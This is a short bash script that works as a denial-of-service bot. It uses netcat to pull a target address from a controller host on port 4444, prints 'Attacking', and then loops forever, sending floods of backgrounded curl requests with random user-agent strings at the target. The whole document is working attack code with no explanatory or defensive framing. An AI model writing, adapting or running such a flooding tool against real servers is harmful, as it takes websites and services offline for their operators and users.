#!/bin/bash
nc 192.168.0.26 4444 --recv-only > ip.txt
a=$(cat ip.txt)
r=$RANDOM
b=$RANDOM
n=$RANDOM
d=$RANDOM
echo 'Attacking' $a
while [ 1 ]; do
curl -s $a -A $d -o null > /dev/null 2>&1 | curl -s $a -A $n -o null > /dev/null 2>&1 | curl -s $a -A $b -o null > /dev/null 2>&1 | curl -s $a -A $r -o null > /dev/null 2>&1 &                                   
echo sent packets to $a
done
pkill curl

